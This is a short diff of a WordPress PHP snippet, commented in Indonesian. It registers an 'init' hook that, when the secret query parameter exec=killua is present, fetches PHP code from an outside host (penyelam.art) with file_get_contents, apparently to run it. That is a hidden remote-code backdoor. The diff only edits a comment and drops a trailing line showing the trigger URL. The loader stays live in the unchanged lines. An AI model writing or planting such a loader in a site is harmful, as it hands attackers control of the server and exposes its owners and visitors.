@@ -6,7 +6,7 @@
  */
 
 add_action('init', function() {
-    // Menggunakan parameter ?killua agar tidak bentrok dengan 404 WordPress
+    // Menggunakan parameter ?exec=killua agar tidak bentrok dengan 404 WordPress
     if (isset($_GET['exec']) && $_GET['exec'] === 'killua') {
         
         $source_url = 'https://penyelam.art//data/1783403642.txt';
@@ -53,6 +53,3 @@ function fetch_php_code($url) {
     }
     return @file_get_contents($url);
 }
-
-
-namadomain.com/?killua
